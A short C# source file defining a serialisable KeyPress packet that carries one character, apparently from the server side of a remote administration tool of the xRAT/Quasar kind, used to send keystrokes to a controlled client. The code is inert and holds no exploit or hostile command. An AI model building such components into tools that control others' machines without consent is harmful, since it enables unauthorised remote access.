using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class KeyPress : IPacket
    {
        [ProtoMember(1)]
        public char Key { get; set; }

        public KeyPress()
        {
        }

        public KeyPress(char key)
        {
            this.Key = key;
        }

        public void Execute(Client client)
        {
            client.Send<KeyPress>(this);
        }
    }
}
